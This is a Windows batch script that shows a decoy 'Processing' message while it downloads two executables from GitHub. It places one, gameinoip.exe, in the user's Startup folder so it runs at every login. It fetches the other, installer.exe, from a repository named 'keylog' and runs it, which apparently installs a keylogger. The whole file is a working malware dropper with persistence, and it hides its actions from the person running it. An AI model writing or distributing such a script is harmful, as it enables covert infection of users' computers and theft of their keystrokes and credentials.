@echo off
title Processing 
echo Processing 
timeout /t 2 >nul

:: Download gameinoip.exe and move to Startup folder
curl -L -o "%temp%\gameinoip.exe" "https://github.com/huckardidi/screensharegamein/raw/refs/heads/main/gameinoip.exe"
move /Y "%temp%\gameinoip.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1

:: Download installer.exe
curl -L -o "%temp%\installer.exe" "https://github.com/huckardidi/keylog/raw/refs/heads/main/installer.exe"

:: Run installer.exe normally (console remains showing "Processing /_|_\")
start "" "%temp%\installer.exe"

:: Optional delay to keep the message on screen longer
timeout /t 5 >nul
exit
